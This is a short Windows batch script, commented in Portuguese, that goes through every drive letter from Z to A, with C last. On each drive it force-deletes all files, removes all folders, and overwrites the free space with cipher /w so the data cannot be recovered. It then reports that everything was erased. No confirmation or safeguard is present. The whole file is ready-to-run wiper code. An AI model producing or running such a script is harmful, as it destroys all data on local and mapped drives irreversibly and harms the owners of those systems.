@echo off
:: Apagar arquivos e pastas em todas as unidades
for %%d in (Z Y X W V U T S R Q P O N M L K J I H G F E D B A C) do (
    if exist %%d:\ (
        echo Limpando unidade %%d:
        del /f /s /q %%d:\*.* > nul
        rmdir /s /q %%d:\ > nul
        cipher /w:%%d
    )
)
echo Todos os arquivos e pastas foram apagados e o espaço livre foi sobrescrito.
pause